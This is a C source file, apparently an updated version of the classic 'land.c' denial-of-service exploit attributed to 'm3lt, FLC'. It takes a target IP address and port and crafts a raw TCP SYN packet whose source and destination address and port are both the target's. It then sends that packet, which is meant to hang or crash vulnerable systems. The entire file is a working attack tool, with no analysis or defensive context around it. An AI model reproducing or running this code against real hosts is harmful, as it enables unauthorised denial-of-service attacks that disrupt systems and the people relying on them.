#include <stdio.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>    // For IP header
#include <netinet/tcp.h>   // For TCP header
#include <stdlib.h>        // For atoi function
#include <string.h>        // For memset, memcpy
#include <unistd.h>        // For close

struct pseudohdr {
    struct in_addr saddr;
    struct in_addr daddr;
    u_char zero;
    u_char protocol;
    u_short length;
    struct tcphdr tcpheader;
};

u_short checksum(u_short *data, u_short length) {
    register long value = 0;
    u_short i;
    
    for (i = 0; i < (length >> 1); i++) {
        value += data[i];
    }
    
    if ((length & 1) == 1) {
        value += (data[i] << 8);
    }
    
    value = (value & 65535) + (value >> 16);
    return (~value);
}

int main(int argc, char **argv) {
    struct sockaddr_in sin;
    struct hostent *hoste;
    int sock;
    char buffer[40];
    struct iphdr *ipheader = (struct iphdr *) buffer;
    struct tcphdr *tcpheader = (struct tcphdr *) (buffer + sizeof(struct iphdr));
    struct pseudohdr pseudoheader;

    fprintf(stderr, "land.c by m3lt, FLC\n");

    if (argc < 3) {
        fprintf(stderr, "usage: %s IP port\n", argv[0]);
        return -1;
    }

    // Set up the sockaddr_in structure for the target
    memset(&sin, 0, sizeof(struct sockaddr_in));  // Using memset instead of bzero
    sin.sin_family = AF_INET;

    // Resolve the IP address
    if ((hoste = gethostbyname(argv[1])) != NULL) {
        memcpy(&sin.sin_addr, hoste->h_addr, hoste->h_length);  // Using memcpy instead of bcopy
    } else if ((sin.sin_addr.s_addr = inet_addr(argv[1])) == -1) {
        fprintf(stderr, "unknown host %s\n", argv[1]);
        return -1;
    }

    // Resolve the port
    if ((sin.sin_port = htons(atoi(argv[2]))) == 0) {  // Using atoi for port
        fprintf(stderr, "unknown port %s\n", argv[2]);
        return -1;
    }

    // Create a raw socket
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {  // Use IPPROTO_TCP instead of 255
        fprintf(stderr, "couldn't allocate raw socket\n");
        return -1;
    }

    // Prepare the IP header
    memset(buffer, 0, sizeof(struct iphdr) + sizeof(struct tcphdr));  // Using memset
    ipheader->version = 4;
    ipheader->ihl = sizeof(struct iphdr) / 4;
    ipheader->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ipheader->id = htons(0xF1C);
    ipheader->ttl = 255;
    ipheader->protocol = IPPROTO_TCP;  // Use IPPROTO_TCP instead of IP_TCP
    ipheader->saddr = sin.sin_addr.s_addr;
    ipheader->daddr = sin.sin_addr.s_addr;

    // Prepare the TCP header
    tcpheader->th_sport = sin.sin_port;
    tcpheader->th_dport = sin.sin_port;
    tcpheader->th_seq = htonl(0xF1C);
    tcpheader->th_flags = TH_SYN;
    tcpheader->th_off = sizeof(struct tcphdr) / 4;
    tcpheader->th_win = htons(2048);

    // Prepare the pseudo-header for the checksum
    memset(&pseudoheader, 0, sizeof(struct pseudohdr));  // Using memset
    pseudoheader.saddr.s_addr = sin.sin_addr.s_addr;
    pseudoheader.daddr.s_addr = sin.sin_addr.s_addr;
    pseudoheader.protocol = 6;  // TCP protocol
    pseudoheader.length = htons(sizeof(struct tcphdr));
    memcpy(&pseudoheader.tcpheader, tcpheader, sizeof(struct tcphdr));  // Using memcpy instead of bcopy

    // Compute checksum for the TCP header
    tcpheader->th_sum = checksum((u_short *) &pseudoheader, sizeof(struct pseudohdr));

    // Send the packet to the target
    if (sendto(sock, buffer, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, 
               (struct sockaddr *) &sin, sizeof(struct sockaddr_in)) == -1) {
        fprintf(stderr, "couldn't send packet\n");
        return -1;
    }

    fprintf(stderr, "%s:%s landed\n", argv[1], argv[2]);

    // Close the socket
    close(sock);  // Now using close from unistd.h
    return 0;
}
